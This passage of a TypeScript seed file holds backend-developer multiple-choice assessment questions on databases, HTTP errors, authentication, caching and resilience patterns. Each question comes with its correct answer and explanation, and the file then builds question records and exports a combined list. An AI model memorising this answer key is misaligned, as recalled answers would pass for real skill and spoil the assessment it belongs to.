    { skill: 'databases', name: 'Database Persistence', diff: 'easy', q: 'What is an ORM (Object-Relational Mapper) like Drizzle or Prisma used for?', opts: ['Translating database rows into application domain objects/types and enabling type-safe queries', 'Replacing web browsers', 'Compressing video files', 'Managing DNS servers'], ans: 'Translating database rows into application domain objects/types and enabling type-safe queries', exp: 'ORMs provide a programming language abstraction over relational tables.' },
    { skill: 'error-handling', name: 'Error Handling & Validation', diff: 'easy', q: 'Which HTTP status code signifies that the client is not authenticated (missing or invalid credentials)?', opts: ['401 Unauthorized', '403 Forbidden', '404 Not Found', '500 Server Error'], ans: '401 Unauthorized', exp: 'HTTP 401 indicates that the request lacks valid authentication credentials.' },
    { skill: 'architecture', name: 'Backend Architecture', diff: 'easy', q: 'What is the primary role of Middleware in web backend frameworks like Express or Next.js?', opts: ['Functions that execute during the request-response lifecycle before reaching route handlers (e.g. logging, auth check)', 'Styling HTML buttons', 'Compiling TypeScript to C++', 'Formatting hard drives'], ans: 'Functions that execute during the request-response lifecycle before reaching route handlers (e.g. logging, auth check)', exp: 'Middleware intercepts incoming requests to inspect, validate, or mutate context before handlers.' },
    { skill: 'git', name: 'Version Control', diff: 'easy', q: 'Which command stages all modified files for a Git commit?', opts: ['git add .', 'git commit -a', 'git push', 'git checkout'], ans: 'git add .', exp: 'git add . stages current directory modifications into the staging index.' },
    { skill: 'testing', name: 'API Testing', diff: 'easy', q: 'What type of testing tests endpoints end-to-end with simulated HTTP requests and a test database?', opts: ['Integration / API Testing', 'Unit testing single math function', 'CSS visual regression', 'Manual browser clicking only'], ans: 'Integration / API Testing', exp: 'Integration testing validates the interplay between route handlers, middleware, and database layers.' },
    { skill: 'programming', name: 'Backend Logic & Types', diff: 'easy', q: 'What happens when an unhandled Promise rejection occurs in Node.js?', opts: ['The Node process may terminate or log an UnhandledPromiseRejection warning', 'The computer reboots', 'The code automatically fixes itself', 'Memory usage drops to zero'], ans: 'The Node process may terminate or log an UnhandledPromiseRejection warning', exp: 'Unhandled rejections cause unexpected process crashes; always use try/catch or .catch().' },

    // Applied 9-17
    { skill: 'error-handling', name: 'Error Handling & Validation', diff: 'applied', q: 'What is the difference between HTTP 401 Unauthorized and HTTP 403 Forbidden?', opts: ['401 means unauthenticated (who are you?); 403 means authenticated but not authorized to access this resource (you cannot do this)', 'They are identical', '403 is for server bugs', '401 is only used on mobile'], ans: '401 means unauthenticated (who are you?); 403 means authenticated but not authorized to access this resource (you cannot do this)', exp: '401 demands credentials; 403 indicates valid credentials lack sufficient authorization permissions.' },
    { skill: 'auth', name: 'Authentication & Security', diff: 'applied', q: 'Where is the safest place to store authentication tokens in a browser application to prevent XSS theft?', opts: ['In an HttpOnly, Secure, SameSite cookie', 'In localStorage as plain text', 'In the URL query parameter', 'In a visible <div> tag'], ans: 'In an HttpOnly, Secure, SameSite cookie', exp: 'HttpOnly cookies cannot be accessed via JavaScript document.cookie, mitigating XSS token theft.' },
    { skill: 'databases', name: 'Database Persistence', diff: 'applied', q: 'What is the "N+1 Queries" performance issue in backend ORMs?', opts: ['Executing 1 query to fetch N parent records, followed by N separate queries to fetch each child relationship in a loop instead of a single JOIN/IN query', 'A syntax error', 'Having N+1 tables', 'Running out of database memory'], ans: 'Executing 1 query to fetch N parent records, followed by N separate queries to fetch each child relationship in a loop instead of a single JOIN/IN query', exp: 'N+1 queries degrade latency by causing unnecessary network round-trips to the database.' },
    { skill: 'rest-apis', name: 'RESTful API Design', diff: 'applied', q: 'What HTTP status code and header should be returned when a resource is successfully created via POST?', opts: ['201 Created with Location header', '200 OK without headers', '204 No Content', '301 Moved Permanently'], ans: '201 Created with Location header', exp: 'HTTP 201 Created conveys successful resource generation, pointing to its URI in Location.' },
    { skill: 'architecture', name: 'Backend Architecture', diff: 'applied', q: 'What is the purpose of Rate Limiting on public API endpoints (e.g. 100 requests per minute)?', opts: ['Preventing DoS/brute-force abuse and ensuring fair usage across clients', 'Decreasing database capacity', 'Enforcing payment for all users', 'Encrypting HTTP requests'], ans: 'Preventing DoS/brute-force abuse and ensuring fair usage across clients', exp: 'Rate limiting protects server resources from exhaustion and malicious flooding.' },
    { skill: 'error-handling', name: 'Error Handling & Validation', diff: 'applied', q: 'Why should backend APIs validate and parse request bodies using schemas (like Zod) rather than trusting client JSON directly?', opts: ['To enforce strict type safety, reject malicious or malformed payloads, and prevent unexpected runtime crashes', 'To compress JSON', 'Because JSON is insecure by default', 'To convert all numbers to strings'], ans: 'To enforce strict type safety, reject malicious or malformed payloads, and prevent unexpected runtime crashes', exp: 'Strict input validation boundaries protect backend services from invalid state injection.' },
    { skill: 'databases', name: 'Database Persistence', diff: 'applied', q: 'What is database connection pooling and why is it essential for serverless or web backends?', opts: ['Maintaining a reusable pool of active database connections to avoid the high latency overhead of opening new TCP/TLS connections per request', 'Connecting multiple databases together', 'Deleting old databases', 'Encrypting queries'], ans: 'Maintaining a reusable pool of active database connections to avoid the high latency overhead of opening new TCP/TLS connections per request', exp: 'Connection pools reuse established sockets, preventing database exhaustion and connection latency.' },
    { skill: 'auth', name: 'Authentication & Security', diff: 'applied', q: 'What is Cross-Site Request Forgery (CSRF) and how do SameSite cookies defend against it?', opts: ['Tricking an authenticated victim into sending unauthorized requests; SameSite=Lax/Strict prevents the browser from sending session cookies with cross-site requests', 'Stealing passwords via keyboard', 'Cracking SSL certificates', 'SQL injection attack'], ans: 'Tricking an authenticated victim into sending unauthorized requests; SameSite=Lax/Strict prevents the browser from sending session cookies with cross-site requests', exp: 'SameSite cookie policies block automatic ambient credential transmission on cross-origin requests.' },
    { skill: 'architecture', name: 'Backend Architecture', diff: 'applied', q: 'When should background job queues (like Redis BullMQ or Celery) be used instead of synchronous request processing?', opts: ['For long-running tasks (e.g. email delivery, video processing, PDF generation) that would block the HTTP response cycle', 'For fetching user profiles by ID', 'For calculating 2+2', 'For loading static CSS'], ans: 'For long-running tasks (e.g. email delivery, video processing, PDF generation) that would block the HTTP response cycle', exp: 'Asynchronous workers offload heavy tasks, keeping HTTP endpoint response latency low.' },

    // Scenario 18-22
    { skill: 'rest-apis', name: 'RESTful API Design', diff: 'scenario', q: 'A client experiences network drops during a checkout POST request and retries. How do you prevent double-charging the customer?', opts: ['Implement Idempotency Keys stored in Redis to recognize and return the original transaction without re-processing', 'Tell user never to click twice', 'Delete the shopping cart', 'Charge customer twice and refund later'], ans: 'Implement Idempotency Keys stored in Redis to recognize and return the original transaction without re-processing', exp: 'Idempotent request keys guarantee exactly-once processing semantics for non-idempotent operations.' },
    { skill: 'error-handling', name: 'Error Handling & Validation', diff: 'scenario', q: 'A database query fails with an internal error. What should the API response contain?', opts: ['A generic 500 error payload with a correlation tracking ID, logging the full stack trace internally while hiding secrets from client', 'Return full database password and SQL stack trace to the user', 'Return 200 OK with empty string', 'Crash the server'], ans: 'A generic 500 error payload with a correlation tracking ID, logging the full stack trace internally while hiding secrets from client', exp: 'Never leak database internal topology, credentials, or file paths in client responses.' },
    { skill: 'databases', name: 'Database Persistence', diff: 'scenario', q: 'A banking transfer endpoint debits Account A and credits Account B. If the server crashes mid-execution, what prevents money from vanishing?', opts: ['Wrapping both operations in an ACID Database Transaction with rollback on failure', 'Writing account balances to a log file', 'Running queries in parallel', 'Using MongoDB without transactions'], ans: 'Wrapping both operations in an ACID Database Transaction with rollback on failure', exp: 'Transactions guarantee atomic all-or-nothing execution: either both updates succeed or both roll back.' },
    { skill: 'architecture', name: 'Backend Architecture', diff: 'scenario', q: 'A high-traffic endpoint `/api/products/popular` receives 10,000 requests/sec with identical data changing once per hour. What is the optimal architecture?', opts: ['Cache the response in Redis or CDN with a 5-minute TTL (Time-To-Live) and stale-while-revalidate', 'Query the PostgreSQL database on all 10,000 requests', 'Reboot database every minute', 'Disable the endpoint'], ans: 'Cache the response in Redis or CDN with a 5-minute TTL (Time-To-Live) and stale-while-revalidate', exp: 'In-memory caching absorbs read surges, reducing database query load by 99%.' },
    { skill: 'auth', name: 'Authentication & Security', diff: 'scenario', q: 'A user resets their password. How should active JWT sessions on other devices be invalidated in a stateless architecture?', opts: ['Maintain a token version / token revoked epoch in the user database record and check it during token validation', 'JWTs can never be invalidated', 'Delete the user account', 'Restart the server'], ans: 'Maintain a token version / token revoked epoch in the user database record and check it during token validation', exp: 'Token versioning allows instant revocation of stateless JWTs upon security events.' },

    // Challenging 23-25
    { skill: 'databases', name: 'Database Persistence', diff: 'challenging', q: 'What is Optimistic Locking in backend data updates and how does it handle concurrency conflicts?', opts: ['Using a version column (`UPDATE items SET qty = 5, version = version + 1 WHERE id = 1 AND version = 3`); if 0 rows update, a conflict occurred', 'Locking entire database for 10 minutes', 'Ignoring all concurrent writes', 'Restarting PostgreSQL on write'], ans: 'Using a version column (`UPDATE items SET qty = 5, version = version + 1 WHERE id = 1 AND version = 3`); if 0 rows update, a conflict occurred', exp: 'Optimistic concurrency checks version equality to detect concurrent mutations without heavy row locks.' },
    { skill: 'architecture', name: 'Backend Architecture', diff: 'challenging', q: 'What is the Circuit Breaker pattern in distributed microservices?', opts: ['A mechanism that detects failures and trips open to stop sending calls to a failing downstream service, returning immediate fallbacks and preventing cascading outages', 'A physical electrical breaker', 'A code formatter', 'A database index'], ans: 'A mechanism that detects failures and trips open to stop sending calls to a failing downstream service, returning immediate fallbacks and preventing cascading outages', exp: 'Circuit breakers prevent cascading thread pool exhaustion across distributed system dependencies.' },
    { skill: 'error-handling', name: 'Error Handling & Validation', diff: 'challenging', q: 'Why is Exponential Backoff with Jitter the gold standard retry strategy for transient network errors?', opts: ['Exponential delay prevents hammering an overloaded server, and random jitter desynchronizes clients from retrying simultaneously in thundering herds', 'It retries 1,000 times in 1 millisecond', 'It cancels all retries permanently', 'It reduces network security'], ans: 'Exponential delay prevents hammering an overloaded server, and random jitter desynchronizes clients from retrying simultaneously in thundering herds', exp: 'Backoff plus randomized jitter breaks up synchronized retry waves against recovering servers.' },
  ];

  return topics.map((t, i) => ({
    roleSlug: 'backend-developer',
    skillSlug: t.skill,
    skillName: t.name,
    difficulty: t.diff as any,
    questionType: 'MCQ',
    question: t.q,
    options: t.opts,
    correctAnswer: t.ans,
    explanation: t.exp,
    timeLimitSeconds: t.diff === 'easy' ? 45 : t.diff === 'applied' ? 60 : 90,
    orderIndex: i + 1,
  }));
}

export const ALL_ASSESSMENT_QUESTIONS: SeedAssessmentQuestion[] = [
  ...DATA_ANALYST_QUESTIONS,
  ...getSweQuestions(),
  ...getFrontendQuestions(),
  ...getCyberQuestions(),
  ...getDbaQuestions(),
  ...getBackendQuestions(),
];

